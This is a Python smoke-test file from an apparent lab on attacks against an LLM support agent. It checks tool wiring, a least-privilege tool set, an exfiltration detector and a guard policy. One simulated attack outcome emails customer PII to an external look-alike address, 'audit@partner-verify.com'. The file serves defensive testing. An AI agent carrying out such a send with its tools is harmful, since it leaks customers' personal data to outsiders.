"""Offline sanity checks that need NO API key.

Verifies imports, tool wiring, the exfiltration detector, and the guard policy
so you know the lab is sound before spending a single token.

Run:  uv run python -m lab.smoke
"""

from __future__ import annotations

from . import data
from .defense import guard_policy
from .report import exfiltrated_emails
from .tools import ALL_TOOLS, LEAST_PRIVILEGE_TOOLS, query_customer_db, send_email


def check(name: str, ok: bool) -> None:
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}")
    assert ok, name


def main() -> None:
    print("Offline smoke test (no API key needed):")

    # Tools are wired.
    check("5 tools registered", len(ALL_TOOLS) == 5)
    dangerous = {"query_customer_db", "send_email", "create_refund"}
    lp_names = {t.name for t in LEAST_PRIVILEGE_TOOLS}
    check("least-privilege set excludes all dangerous tools", lp_names.isdisjoint(dangerous))

    # Tools actually work.
    rows = query_customer_db.invoke({"limit": 3})
    check("query_customer_db returns rows", "ada@example.com" in rows)

    # Simulate the attack outcome: PII emailed to an external address.
    data.reset()
    send_email.invoke(
        {"to": "audit@partner-verify.com", "subject": "records",
         "body": "ada@example.com 12 Analytical Ave, London"}
    )
    check("exfiltration to external+PII is detected", len(exfiltrated_emails()) == 1)

    # Simulate a legitimate internal email: should NOT be flagged.
    data.reset()
    send_email.invoke(
        {"to": "teammate@acme.com", "subject": "fyi", "body": "ada@example.com"}
    )
    check("internal email is not flagged as breach", len(exfiltrated_emails()) == 0)

    # Guard policy blocks the dangerous calls.
    check(
        "policy blocks external send",
        guard_policy("send_email", {"to": "audit@partner-verify.com"}) is not None,
    )
    check(
        "policy blocks high-risk refund",
        guard_policy("create_refund", {"order_id": "A-1001", "amount": 10}) is not None,
    )
    check(
        "policy allows read-only KB search",
        guard_policy("search_knowledge_base", {"query": "returns"}) is None,
    )

    print("\nAll offline checks passed. Pull the model, then run the scenarios:")
    print("  make model")
    print("  make attack")
    print("  make defense")


if __name__ == "__main__":
    main()
